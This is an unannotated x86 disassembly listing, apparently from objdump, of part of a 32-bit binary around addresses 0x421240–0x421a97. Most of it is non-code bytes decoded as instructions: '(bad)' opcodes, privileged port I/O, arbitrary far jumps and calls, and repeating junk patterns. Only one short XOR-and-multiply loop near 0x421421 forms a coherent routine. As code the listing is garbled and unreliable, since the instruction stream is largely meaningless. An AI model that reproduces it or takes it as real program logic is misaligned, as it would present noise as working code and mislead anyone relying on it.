  42123f:	add    ah,bh
  421241:	inc    esi
  421242:	pop    ds
  421243:	into   
  421244:	mov    ds:0x965bf693,al
  421249:	js     0x42126a
  42124b:	imul   ecx,DWORD PTR [edx-0x64],0x47
  42124f:	lock cmp eax,0x8618c368
  421255:	fidiv  WORD PTR [eax-0x6d98e98f]
  42125b:	popf   
  42125c:	push   ebp
  42125d:	mov    ah,0x5d
  42125f:	mov    edx,0x9ac7a13a
  421264:	out    0x30,eax
  421266:	ins    DWORD PTR es:[edi],dx
  421267:	jb     0x421225
  421269:	fwait
  42126a:	ins    DWORD PTR es:[edi],dx
  42126b:	cmp    edx,DWORD PTR [edi-0x76]
  42126e:	sbb    eax,0x7a007de5
  421273:	xchg   ecx,eax
  421274:	push   0xfb683625
  421279:	aaa    
  42127a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42127b:	imul   esi,DWORD PTR [edx],0x1bfdd1ed
  421281:	push   ebx
  421282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421284:	jae    0x421234
  421286:	pop    ecx
  421287:	ins    DWORD PTR es:[edi],dx
  421288:	dec    ebx
  421289:	(bad)  
  42128a:	in     eax,dx
  42128b:	aas    
  42128c:	and    eax,0x6c82a16e
  421291:	test   al,0x2a
  421293:	xor    edx,DWORD PTR [edi-0x12]
  421296:	out    0x7f,al
  421298:	rol    BYTE PTR [ecx+0x21],cl
  42129b:	cmp    ebp,edx
  42129d:	hlt    
  42129e:	push   es
  42129f:	jle    0x4212ab
  4212a1:	rcl    DWORD PTR [ebp-0x4c99ea91],0xff
  4212a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212a9:	popf   
  4212aa:	fldenv [edx-0x5ab88799]
  4212b0:	in     al,0xe5
  4212b2:	and    BYTE PTR [esi-0x484d412],bh
  4212b8:	ins    DWORD PTR es:[edi],dx
  4212b9:	mov    dh,0x79
  4212bb:	mov    bl,0x4b
  4212bd:	je     0x421280
  4212bf:	xor    bl,ch
  4212c1:	or     bh,BYTE PTR [ebx]
  4212c3:	fiadd  WORD PTR [edi]
  4212c5:	and    al,0xa6
  4212c7:	out    0xb1,eax
  4212c9:	inc    eax
  4212ca:	add    eax,eax
  4212cc:	and    ebx,DWORD PTR [edx]
  4212ce:	inc    ebp
  4212cf:	jge    0x4212f9
  4212d1:	pop    es
  4212d2:	mov    WORD PTR [edx],?
  4212d4:	push   ss
  4212d5:	icebp  
  4212d6:	add    ebx,ecx
  4212d8:	arpl   WORD PTR [eax-0x53],sp
  4212db:	mov    dh,0xb5
  4212dd:	aas    
  4212de:	mov    dl,0x3b
  4212e0:	push   es
  4212e1:	jns    0x4212c4
  4212e3:	add    BYTE PTR [eax],ch
  4212e5:	push   edx
  4212e6:	add    DWORD PTR [edx],ecx
  4212e8:	shl    BYTE PTR [ecx],cl
  4212ea:	mov    cl,0xf
  4212ec:	ss dec ebp
  4212ee:	lods   eax,DWORD PTR ds:[esi]
  4212ef:	dec    ecx
  4212f0:	sub    eax,0xb89605ce
  4212f5:	sbb    DWORD PTR [edx-0x73d42fe6],edi
  4212fb:	and    ebx,eax
  4212fd:	gs jnp 0x421330
  421300:	mov    ah,0x94
  421302:	pusha  
  421303:	xchg   esi,edx
  421305:	scas   eax,DWORD PTR es:[edi]
  421306:	ins    BYTE PTR es:[edi],dx
  421307:	jg     0x42134e
  421309:	or     DWORD PTR [esi+ebx*8+0x2c],esp
  42130d:	mov    al,ds:0xf77f2e10
  421312:	call   0x5956:0xc20913ca
  421319:	imul   ebx,DWORD PTR [esi-0x4bb3d897],0x5d1093a7
  421323:	enter  0xbff9,0xca
  421327:	jecxz  0x4212ba
  421329:	cmp    eax,0x775a119a
  42132e:	jmp    0x4212eb
  421330:	shr    BYTE PTR [edi],1
  421332:	jle    0x42135f
  421334:	or     eax,0xbc95aa7a
  421339:	dec    ebx
  42133a:	or     BYTE PTR [esi-0x39],0x91
  42133e:	jo     0x421312
  421340:	mov    ebx,DWORD PTR ds:[ebp+ecx*1+0x37]
  421345:	add    eax,0x87a361ba
  42134a:	lea    ebx,[ebp+0x14]
  42134d:	loop   0x4213a2
  42134f:	out    dx,al
  421350:	add    dl,bh
  421352:	loope  0x421393
  421354:	push   edx
  421355:	xor    DWORD PTR [ecx-0x1b1ace49],0xc25ed49b
  42135f:	inc    edx
  421360:	fdivr  DWORD PTR [eax+0x39]
  421363:	xchg   ecx,eax
  421364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421365:	xchg   esi,eax
  421366:	data16 sbb ah,cl
  421369:	xor    DWORD PTR [ecx+ebx*2+0x247b7e3c],edx
  421370:	(bad)  
  421371:	shl    BYTE PTR [ebp+0xeb59102],0x58
  421378:	xchg   ebx,eax
  421379:	or     DWORD PTR [edx],eax
  42137b:	mov    dl,0x9d
  42137d:	xor    bl,cl
  42137f:	cmp    BYTE PTR [edx-0x25],al
  421382:	jns    0x421339
  421384:	stos   BYTE PTR es:[edi],al
  421385:	retf   0x620c
  421388:	inc    ebp
  421389:	in     eax,dx
  42138a:	cld    
  42138b:	adc    dl,BYTE PTR [ecx-0x113afbc0]
  421391:	xchg   edx,eax
  421392:	cld    
  421393:	xchg   BYTE PTR [edi+ecx*8-0x6406195],dh
  42139a:	sub    edx,DWORD PTR [ecx+0x7362c9a4]
  4213a0:	sbb    al,0x71
  4213a2:	inc    edi
  4213a3:	jge    0x421416
  4213a5:	cli    
  4213a6:	jne    0x4213fb
  4213a8:	je     0x4213a3
  4213aa:	or     BYTE PTR [edx],dl
  4213ac:	jns    0x42137e
  4213ae:	or     al,0x84
  4213b0:	call   0xc56b:0x2535814
  4213b7:	pop    ebx
  4213b8:	dec    ecx
  4213b9:	mov    al,ds:0x2953ccec
  4213be:	mov    ds:0xefb6288,eax
  4213c3:	add    ebx,DWORD PTR [edi+0x33c15cf5]
  4213c9:	ret    0x4fa5
  4213cc:	push   0xe7a77e32
  4213d1:	mov    ds:0x108018aa,al
  4213d6:	inc    edi
  4213d7:	dec    edx
  4213d8:	dec    esp
  4213d9:	fisubr WORD PTR [edi+0x9]
  4213dc:	jge    0x4213c1
  4213de:	inc    ecx
  4213df:	mov    bl,dl
  4213e1:	xlat   BYTE PTR ds:[ebx]
  4213e2:	push   ecx
  4213e3:	push   ebx
  4213e4:	sbb    DWORD PTR [edx-0x68],ebx
  4213e7:	pop    ebp
  4213e8:	cmp    al,0xe0
  4213ea:	cmp    dh,ah
  4213ec:	pop    ds
  4213ed:	mov    ecx,0x7ad9450f
  4213f2:	pop    ds
  4213f3:	push   eax
  4213f4:	rcr    DWORD PTR [esi+eax*8+0x2d],1
  4213f8:	test   DWORD PTR [esi],ecx
  4213fa:	fsubr  DWORD PTR [eax-0x6f]
  4213fd:	aam    0x85
  4213ff:	pmuludq mm6,QWORD PTR [esp+eax*2]
  421403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421404:	out    dx,al
  421405:	mov    bh,0x4f
  421407:	push   0x24f9b3c4
  42140c:	sub    eax,0x4d8b1fa7
  421411:	or     BYTE PTR [ebx],dh
  421413:	enter  0xce03,0xf
  421417:	test   DWORD PTR [ebx-0x24],esp
  42141a:	(bad)  
  42141b:	(bad)  
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0x193e88e2
  42147c:	dec    ecx
  42147d:	xlat   BYTE PTR ds:[ebx]
  42147e:	ja     0x42144d
  421480:	add    DWORD PTR [eax],eax
  421482:	pop    ebx
  421483:	add    BYTE PTR [eax],al
  421485:	add    BYTE PTR [esi],al
  421487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421488:	js     0x421486
  42148a:	inc    ebp
  42148b:	adc    al,0xb7
  42148d:	ins    DWORD PTR es:[edi],dx
  42148e:	bound  ecx,QWORD PTR [eax+0x76fa85c9]
  421494:	push   ecx
  421495:	imul   ecx,edx,0x317fe099
  42149b:	or     ebx,DWORD PTR [edi]
  42149d:	mov    eax,ds:0xaa2f186e
  4214a2:	cmp    DWORD PTR [eax+eiz*1+0x5469fa7c],esi
  4214a9:	je     0x4214b7
  4214ab:	mov    BYTE PTR [ebx],bh
  4214ad:	and    DWORD PTR [edi],ecx
  4214af:	dec    eax
  4214b0:	and    dl,dh
  4214b2:	mov    ebp,0xc6fbf953
  4214b7:	jmp    0x5d77:0x4ad0c117
  4214be:	outs   dx,DWORD PTR ds:[esi]
  4214bf:	outs   dx,BYTE PTR ds:[esi]
  4214c0:	mov    ecx,0xd724c5f8
  4214c5:	dec    edi
  4214c6:	retf   
  4214c7:	dec    esp
  4214c8:	xchg   edx,eax
  4214c9:	mov    es:0xc6ad43aa,al
  4214cf:	push   ss
  4214d0:	push   ebx
  4214d1:	cmp    eax,0x9b87a74a
  4214d6:	push   ebp
  4214d7:	add    eax,0xb6621917
  4214dc:	retf   
  4214dd:	dec    ecx
  4214de:	pushf  
  4214df:	div    DWORD PTR [esi+0x0]
	...
  4214ee:	shr    DWORD PTR [esp+edx*1],1
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0xb757b192
  4214fe:	ror    ch,cl
  421500:	add    DWORD PTR [eax],eax
  421502:	pop    ebx
  421503:	add    BYTE PTR [eax],al
  421505:	add    BYTE PTR [ebx+0x1e],ah
  421508:	bound  edx,QWORD PTR [esp+ebp*1+0x6b]
  42150c:	add    al,0x8d
  42150e:	stos   DWORD PTR es:[edi],eax
  42150f:	inc    edi
  421510:	in     eax,dx
  421511:	popa   
  421512:	lods   al,BYTE PTR ds:[esi]
  421513:	inc    esi
  421514:	push   edi
  421515:	adc    DWORD PTR [esi],ebp
  421517:	in     al,dx
  421518:	jmp    0x71df:0x8aa47391
  42151f:	jmp    0x421590
  421521:	and    edi,esp
  421523:	sbb    al,0x55
  421525:	lods   eax,DWORD PTR ds:[esi]
  421526:	icebp  
  421527:	sub    al,0x5d
  421529:	dec    ecx
  42152a:	inc    ebp
  42152b:	mov    cs,WORD PTR [ebp-0x6f2b3874]
  421531:	mov    BYTE PTR [edi+edx*8-0x4c],dl
  421535:	mov    BYTE PTR [edx-0x702927cc],ch
  42153b:	push   ebx
  42153c:	jecxz  0x42153c
  42153e:	jb     0x4215a0
  421540:	out    0xf8,eax
  421542:	lds    ebp,FWORD PTR [ebp-0x47]
  421545:	jle    0x421588
  421547:	(bad)  
  421548:	mov    ecx,0xe3e11d8e
  42154d:	test   al,0xc
  42154f:	jae    0x4214e5
  421551:	push   0xfffffff4
  421553:	xor    eax,0xf2bc2de
  421558:	arpl   WORD PTR ds:0xcff6e75f,bp
  42155e:	(bad)  
  421560:	retf   
	...
  42156d:	add    BYTE PTR [edi],bl
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2+0x259dfdbf],0x2d
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	pop    ebx
  421583:	add    BYTE PTR [eax],al
  421585:	add    BYTE PTR ds:0xb330e4e7,bl
  42158b:	mov    dl,0x84
  42158d:	lea    eax,[di+0x21]
  421591:	lds    ebx,FWORD PTR [edi+0x50]
  421594:	mov    ds:0xdd9eb41,eax
  421599:	repnz loop 0x4215d9
  42159c:	aad    0xc1
  42159e:	dec    ecx
  42159f:	jp     0x42153f
  4215a1:	pop    edx
  4215a2:	fstp   TBYTE PTR [edx+0x38]
  4215a5:	and    ebx,DWORD PTR [ecx+esi*1]
  4215a8:	sbb    al,0xa9
  4215aa:	xchg   ebp,eax
  4215ab:	cmc    
  4215ac:	cmp    BYTE PTR [esi],bl
  4215ae:	popf   
  4215af:	leave  
  4215b0:	sbb    esi,ebp
  4215b2:	loopne 0x4215b7
  4215b4:	push   esp
  4215b5:	mov    WORD PTR [ecx],ss
  4215b7:	push   es
  4215b8:	sti    
  4215b9:	(bad)  
  4215ba:	sbb    al,0xa1
  4215bc:	pop    eax
  4215bd:	(bad)  
  4215be:	int    0xe0
  4215c0:	dec    edi
  4215c1:	sub    eax,0x9b72dac4
  4215c6:	inc    ebx
  4215c7:	dec    ebx
  4215c8:	mov    esi,0x4ca8bb04
  4215cd:	mov    ebx,0xe918ca72
  4215d2:	push   edi
  4215d3:	inc    edx
  4215d4:	fistp  DWORD PTR [ebx+0x782d63a9]
  4215da:	lock jl 0x42156e
  4215dd:	loopne 0x421588
  4215df:	pop    eax
  4215e0:	call   0x4215e5
	...
  4215ed:	add    BYTE PTR [edi],ch
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	dec    ebp
  4215fb:	sub    al,0x30
  4215fd:	mov    ds:0x1ce88,al
  421602:	pop    ebx
  421603:	add    BYTE PTR [eax],al
  421605:	add    BYTE PTR [edi*8+0x770063c2],ah
  42160c:	fucomp st(0)
  42160e:	inc    eax
  42160f:	mov    eax,DWORD PTR [esi-0x1e6b242b]
  421615:	push   0xeb053f40
  42161a:	and    al,0xef
  42161c:	test   BYTE PTR [eax+eiz*1],dh
  42161f:	sub    DWORD PTR [eax],0x3c6bafe2
  421625:	mov    bh,0xbd
  421627:	int    0x22
  421629:	call   0x5e23:0x23d5b603
  421630:	aaa    
  421631:	and    eax,0x72403180
  421636:	and    BYTE PTR [edx],ch
  421638:	xchg   esp,eax
  421639:	pop    edx
  42163a:	mov    eax,0xb2d1e6de
  42163f:	(bad)  
  421640:	aas    
  421641:	in     al,dx
  421642:	xor    DWORD PTR [ebp-0x692b1011],eax
  421648:	add    eax,0x45cfc167
  42164d:	jl     0x421646
  42164f:	and    ecx,ebp
  421651:	cld    
  421652:	push   ebp
  421653:	fwait
  421654:	and    al,0xc6
  421656:	mov    ah,0xd2
  421658:	vcvtss2sd xmm3,xmm1,DWORD PTR [ecx]
  42165c:	xrelease xchg DWORD PTR [eax+0x6ea9],ecx
	...
  42166b:	add    BYTE PTR [eax],al
  42166d:	add    dl,cl
  42166f:	mov    al,ds:0xdf7e4d76
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0x35360cf1,al
  42167e:	jecxz  0x42164e
  421680:	add    DWORD PTR [eax],eax
  421682:	pop    ebx
  421683:	add    BYTE PTR [eax],al
  421685:	add    BYTE PTR [edi+0x591e773f],ah
  42168b:	or     eax,0xfc70b212
  421690:	adc    esi,DWORD PTR [ebp-0x410468f2]
  421696:	js     0x4216df
  421698:	hlt    
  421699:	mov    esi,0x859c4231
  42169e:	jle    0x421628
  4216a0:	jbe    0x4216ea
  4216a2:	inc    esi
  4216a3:	rcl    BYTE PTR [edx],cl
  4216a5:	das    
  4216a6:	sub    al,0x93
  4216a8:	jp     0x42166c
  4216aa:	arpl   WORD PTR [ebx+0x7268d684],bp
  4216b0:	pop    ebp
  4216b1:	or     eax,0xe8a80a01
  4216b6:	mov    dl,bl
  4216b8:	push   eax
  4216b9:	xor    al,0xb9
  4216bc:	inc    esp
  4216bd:	push   esp
  4216be:	sbb    esp,esp
  4216c0:	push   edx
  4216c1:	sub    eax,0x557a58ae
  4216c6:	and    al,0x70
  4216c8:	add    al,0xd9
  4216ca:	scas   eax,DWORD PTR es:[edi]
  4216cb:	xchg   esi,eax
  4216cc:	mov    esi,DWORD PTR ds:0xcafd4b58
  4216d2:	push   esi
  4216d3:	pop    esi
  4216d4:	std    
  4216d5:	dec    edx
  4216d6:	sbb    DWORD PTR [esi],ebx
  4216d8:	and    esi,DWORD PTR [eax-0x13]
  4216db:	shl    DWORD PTR ss:[ebx-0x2],1
  4216df:	js     0x421719
	...
  4216ed:	add    dh,al
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	xchg   DWORD PTR [eax],edi
  4216fc:	fdiv   DWORD PTR [ebx+0x3e]
  4216ff:	iret   
  421700:	add    DWORD PTR [eax],eax
  421702:	pop    ebx
  421703:	add    BYTE PTR [eax],al
  421705:	add    BYTE PTR [ebx],bl
  421707:	je     0x42175c
  421709:	into   
  42170a:	dec    edx
  42170b:	jno    0xbb25b62f
  421711:	arpl   WORD PTR [ecx+0x1b66a548],bx
  421717:	inc    edx
  421718:	or     eax,0x42bc5c0f
  42171d:	loop   0x4216da
  42171f:	clc    
  421720:	aam    0x19
  421722:	data16 or al,0x30
  421725:	int3   
  421726:	lds    ecx,FWORD PTR [ebx+0x76]
  421729:	aad    0x63
  42172b:	inc    ecx
  42172c:	test   BYTE PTR [ecx],dh
  42172e:	sahf   
  42172f:	jmp    0xa68c:0xa9df3d6e
  421736:	jo     0x42172c
  421738:	test   DWORD PTR [edx+0x40de1851],ecx
  42173e:	fsub   QWORD PTR [edx+0x17]
  421741:	ins    BYTE PTR es:[edi],dx
  421742:	mov    eax,ds:0x46db3bce
  421747:	pop    ds
  421748:	fist   DWORD PTR [eax+0x6645993e]
  42174e:	mov    WORD PTR [edi*2-0x796307a5],gs
  421755:	fisttp WORD PTR [ebp+0x277e4ba4]
  42175b:	es ffree st(5)
  42175e:	push   es
  42175f:	jp     0x4217b0
	...
  42176d:	add    BYTE PTR [edx+0x34],dl
  421770:	inc    eax
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0xf56a4e09
  42177b:	xchg   ecx,eax
  42177c:	mov    edx,0x1cf993b
  421781:	add    BYTE PTR [ebx+0x0],bl
  421784:	add    BYTE PTR [eax],al
  421786:	popf   
  421787:	call   0x7c86:0xaf3e0467
  42178e:	jmp    0x4217db
  421790:	icebp  
  421791:	xor    DWORD PTR [ebx-0x4],ecx
  421794:	jo     0x4217d8
  421796:	mov    WORD PTR [eax],fs
  421798:	add    ebp,DWORD PTR [eax]
  42179a:	test   DWORD PTR [ebp+0x1c55b99e],ebp
  4217a0:	daa    
  4217a1:	push   0xa152982e
  4217a6:	repnz gs popa 
  4217a9:	stos   BYTE PTR es:[edi],al
  4217aa:	add    dl,BYTE PTR [ecx+0x27]
  4217ad:	imul   ecx,DWORD PTR [ebx],0x67b272bc
  4217b3:	fnstcw WORD PTR [ebx-0x52]
  4217b6:	call   0x297a:0x4223bda9
  4217bd:	and    eax,0x53c45cea
  4217c2:	push   0xffffff86
  4217c4:	popa   
  4217c5:	lahf   
  4217c6:	xor    ch,BYTE PTR [eax]
  4217c8:	xlat   BYTE PTR ds:[ebx]
  4217c9:	pop    ss
  4217ca:	bound  ebx,QWORD PTR [ecx-0x27]
  4217cd:	xchg   edi,eax
  4217ce:	push   esi
  4217cf:	sbb    DWORD PTR [esp+edi*4],esi
  4217d2:	mov    ebx,0x69b1c4ea
  4217d7:	(bad)  
  4217d9:	mov    ch,0x65
  4217db:	push   ds
  4217dc:	cmp    ah,BYTE PTR [edi+0x498297]
	...
  4217ee:	adc    bh,BYTE PTR [edx-0x19073928]
  4217f4:	push   ds
  4217f5:	(bad)  
  4217f6:	adc    bl,dh
  4217f8:	cwde   
  4217f9:	out    dx,al
  4217fa:	xor    DWORD PTR [esi],ebp
  4217fc:	xchg   ebp,eax
  4217fd:	aas    
  4217fe:	add    al,0xe1
  421800:	add    DWORD PTR [eax],eax
  421802:	pop    ebx
  421803:	add    BYTE PTR [eax],al
  421805:	add    BYTE PTR [eax+0x4d],dl
  421808:	or     dh,ch
  42180a:	xor    al,0x6f
  42180c:	(bad)  
  42180d:	jmp    0x9b39ed75
  421812:	and    al,0x60
  421814:	sub    DWORD PTR [edx+0x3],ebp
  421817:	mov    cl,0x14
  421819:	outs   dx,BYTE PTR ds:[esi]
  42181a:	mov    DWORD PTR [ebx-0x65175dd5],0x43122a08
  421824:	dec    eax
  421825:	or     eax,0x5db3031a
  42182a:	mov    ebx,0xccbc0f03
  42182f:	not    esi
  421831:	les    ebx,FWORD PTR [ebx]
  421833:	ss sub al,0xe0
  421836:	mov    eax,ds:0x1334f4d4
  42183b:	scas   eax,DWORD PTR es:[edi]
  42183c:	push   edi
  42183d:	pop    eax
  42183e:	into   
  42183f:	pushf  
  421840:	test   cl,dl
  421842:	cmp    BYTE PTR [edi-0x49],dh
  421845:	mov    DWORD PTR [esi],esp
  421847:	std    
  421848:	add    DWORD PTR [esi],ebp
  42184a:	in     eax,dx
  42184b:	sub    DWORD PTR [ecx+0x48],edx
  42184e:	adc    BYTE PTR [edx+0x653bda97],dl
  421854:	das    
  421855:	(bad)  
  421856:	in     al,dx
  421857:	sbb    al,0x2a
  421859:	jmp    0x17ff:0x95d2e0a1
  421860:	xor    BYTE PTR [eax],al
	...
  42186e:	dec    ecx
  42186f:	inc    esi
  421870:	sub    BYTE PTR [eax],dh
  421872:	das    
  421873:	jle    0x4218ce
  421875:	jg     0x42183d
  421877:	imul   esi,eax,0xffffffd5
  42187a:	mov    ds:0x5f027118,al
  42187f:	loope  0x421882
  421881:	add    BYTE PTR [ebx+0x0],bl
  421884:	add    BYTE PTR [eax],al
  421886:	sub    eax,0xaaadf45f
  42188b:	ins    BYTE PTR es:[edi],dx
  42188c:	pop    ss
  42188d:	and    BYTE PTR [edi],al
  42188f:	mov    eax,ds:0xf8715924
  421894:	aas    
  421895:	fdivr  QWORD PTR [edi]
  421897:	shl    DWORD PTR [esi],0xf3
  42189a:	(bad)  
  42189b:	pop    edx
  42189c:	cdq    
  42189d:	jecxz  0x421868
  42189f:	dec    ebp
  4218a0:	cmp    eax,0x8c0bc9a4
  4218a5:	fdiv   QWORD PTR [eax+0x19]
  4218a8:	sbb    eax,0xb026e636
  4218ad:	xor    al,0xd0
  4218af:	(bad)  
  4218b0:	push   edx
  4218b1:	xchg   DWORD PTR [eax-0x31a1b694],edx
  4218b7:	push   edi
  4218b8:	pop    eax
  4218b9:	inc    esp
  4218ba:	std    
  4218bb:	retf   0xf213
  4218be:	dec    esi
  4218bf:	test   al,0x4
  4218c1:	lds    ebp,FWORD PTR [eax]
  4218c3:	mov    bl,0x5e
  4218c5:	jmp    0xc1667c0c
  4218ca:	add    edi,0xffffffe4
  4218cd:	xor    al,cl
  4218cf:	dec    edx
  4218d0:	pusha  
  4218d1:	cmp    dl,BYTE PTR [eax]
  4218d3:	pop    esi
  4218d4:	mov    esp,0x548ba848
  4218d9:	adc    eax,0x4e64f3e2
  4218de:	mov    ds:0x82f3,al
	...
  4218eb:	add    BYTE PTR [eax],al
  4218ed:	add    BYTE PTR [edi-0x3a],ah
  4218f0:	and    dh,dh
  4218f2:	mov    eax,ds:0xe7d7f7f6
  4218f7:	mov    eax,0x7fe6da72
  4218fc:	mov    ebp,0x1e1ba44
  421901:	add    BYTE PTR [ebx+0x0],bl
  421904:	add    BYTE PTR [eax],al
  421906:	mov    al,ds:0xaddf4e76
  42190b:	xchg   ecx,eax
  42190c:	mov    gs,esp
  42190e:	adc    al,0xa
  421910:	xchg   esi,eax
  421911:	scas   eax,DWORD PTR es:[edi]
  421912:	mov    al,0x43
  421914:	fst    DWORD PTR [eax]
  421916:	call   0xc9116a61
  42191b:	shr    DWORD PTR [ecx+0x75],1
  42191e:	test   edi,esp
  421920:	aaa    
  421921:	add    dh,BYTE PTR [edx+edx*4]
  421924:	nop
  421925:	jge    0x42190a
  421927:	(bad)
  42192a:	jb     0x42195d
  42192c:	pop    ecx
  42192d:	mov    esi,0xb4b4baf9
  421932:	imul   esp,edx,0x19
  421935:	shl    BYTE PTR [ebp-0x50872020],cl
  42193b:	aam    0xd7
  42193d:	not    esp
  42193f:	pop    ebx
  421940:	cld    
  421941:	aad    0xcc
  421943:	jno    0x4218f8
  421945:	and    al,0x28
  421947:	jno    0x421908
  421949:	popa   
  42194a:	gs jmp 0x19118820
  421950:	mov    edi,0xf3c81f55
  421955:	push   ss
  421956:	adc    di,cx
  421959:	ret    0x8723
  42195c:	(bad)  
  42195d:	test   al,0x6e
  42195f:	cmc    
  421960:	aam    0x0
	...
  42196e:	ret    
  42196f:	or     eax,0xefee66a6
  421974:	ret    
  421975:	lods   eax,DWORD PTR ds:[esi]
  421976:	sub    al,0xb8
  421978:	mov    ds:0x922eb47,eax
  42197d:	cwde   
  42197e:	adc    eax,0x5b0001e2
  421983:	add    BYTE PTR [eax],al
  421985:	add    BYTE PTR ds:0x3165aef8,bh
  42198b:	dec    esi
  42198c:	xchg   BYTE PTR [esp+ebx*4-0x24128dd4],dl
  421993:	inc    esi
  421994:	sbb    BYTE PTR [eax+0x2e93137],cl
  42199a:	cli    
  42199b:	cdq    
  42199c:	xchg   edi,eax
  42199d:	push   ss
  42199e:	hlt    
  42199f:	add    eax,0xacd79786
  4219a4:	or     eax,0xe1c7ae0c
  4219a9:	mov    ds:0xe5c12a7d,al
  4219ae:	jnp    0x421999
  4219b0:	ss mov eax,0xe553eaea
  4219b6:	push   ds
  4219b7:	aaa    
  4219b8:	adc    BYTE PTR [eax],cl
  4219ba:	aam    0xc3
  4219bc:	mov    eax,ecx
  4219be:	ret    
  4219bf:	and    eax,0x16a21c24
  4219c4:	adc    al,0xb5
  4219c6:	mov    eax,0xc4dd9709
  4219cb:	pushf  
  4219cc:	push   0x71
  4219ce:	fild   DWORD PTR [eax+0x2257c82]
  4219d4:	jmp    0x4219a0
  4219d6:	pop    esi
  4219d7:	mov    esi,0xc8417064
  4219dc:	out    0xaf,al
  4219de:	mov    edx,0x1c29
	...
  4219eb:	add    BYTE PTR [eax],al
  4219ed:	add    cl,bl
  4219ef:	ret    0x4905
  4219f2:	pop    ds
  4219f3:	iret   
  4219f4:	fst    st(2)
  4219f6:	enter  0xf86f,0xd2
  4219fa:	jae    0x4219b0
  4219fc:	pop    esp
  4219fd:	out    0x70,al
  4219ff:	loop   0x421a02
  421a01:	add    BYTE PTR [eax+0x0],bl
  421a04:	add    BYTE PTR [eax],al
  421a06:	call   0xa825cc22
  421a0b:	mov    fs,WORD PTR [ebp-0x76]
  421a0e:	push   esp
  421a0f:	fistp  QWORD PTR [edi]
  421a11:	loope  0x421a53
  421a13:	fsub   st,st(1)
  421a15:	pushf  
  421a16:	mov    DWORD PTR [edi+0xf],esi
  421a19:	ds retf 0x22cf
  421a1d:	jmp    0x4e71:0x3a1b7922
  421a24:	dec    edx
  421a25:	xor    bl,BYTE PTR [esi]
  421a27:	sub    al,0xa7
  421a29:	mov    fs,eax
  421a2b:	scas   al,BYTE PTR es:[edi]
  421a2c:	imul   eax,DWORD PTR [ebp+edx*1+0xf788fc1],0xffffffab
  421a34:	loop   0x421a24
  421a36:	pusha  
  421a37:	xchg   ebp,eax
  421a38:	pusha  
  421a39:	pop    esi
  421a3a:	jp     0x421a23
  421a3c:	data16 fsubr QWORD PTR [ebx+0x6698b45]
  421a43:	pop    esi
  421a44:	psubd  mm7,mm0
  421a47:	and    edi,DWORD PTR [edx]
  421a49:	xchg   esi,eax
  421a4a:	dec    edi
  421a4b:	sub    DWORD PTR [edi],0x48
  421a4e:	clc    
  421a4f:	push   es
  421a50:	hlt    
  421a51:	push   eax
  421a52:	xchg   edx,eax
  421a53:	fwait
  421a54:	aas    
  421a55:	sbb    BYTE PTR [ecx+0x7a],ch
  421a58:	dec    ecx
  421a59:	adc    esi,DWORD PTR [ecx]
  421a5b:	mov    esp,0x90000807
  421a60:	inc    edx
  421a61:	add    BYTE PTR [eax+edx*4],al
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],cl
  421a67:	nop
  421a68:	inc    edx
  421a69:	add    BYTE PTR [eax+edx*4],cl
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax],dl
  421a6f:	nop
  421a70:	inc    edx
  421a71:	add    BYTE PTR [eax+edx*4],dl
  421a74:	inc    edx
  421a75:	add    BYTE PTR [eax],bl
  421a77:	nop
  421a78:	inc    edx
  421a79:	add    BYTE PTR [eax+edx*4],bl
  421a7c:	inc    edx
  421a7d:	add    BYTE PTR [eax],al
  421a7f:	mov    al,ds:0xa0040042
  421a84:	inc    edx
  421a85:	add    BYTE PTR [eax],cl
  421a87:	mov    al,ds:0xa00c0042
  421a8c:	inc    edx
  421a8d:	add    BYTE PTR [eax],dl
  421a8f:	mov    al,ds:0xa0140042
  421a94:	inc    edx
  421a95:	add    BYTE PTR [eax],bl
  421a97:	mov    al,ds:0xa01c0042
